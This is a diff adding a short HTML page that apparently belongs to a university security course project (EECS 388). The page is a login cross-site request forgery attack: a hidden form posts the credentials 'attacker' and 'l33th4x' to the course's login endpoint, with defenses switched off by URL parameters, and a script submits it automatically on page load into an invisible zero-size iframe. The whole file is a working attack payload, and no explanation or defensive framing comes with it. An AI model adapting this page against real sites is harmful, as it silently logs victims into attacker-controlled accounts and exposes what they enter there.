@@ -1,0 +1,18 @@
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <form name="csrf" method="post" action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" target="iframe">
+        <input type="hidden" name="username" value="attacker" />
+        <input type="hidden" name="password" value="l33th4x" />
+    </form>
+	<div style = "visibility:hidden">
+		<iframe name = "iframe" width = "0" height = "0">
+		</iframe>
+	</div>
+    <script type="text/javascript">
+        document.csrf.submit();
+    </script>
+</body>
+</html>
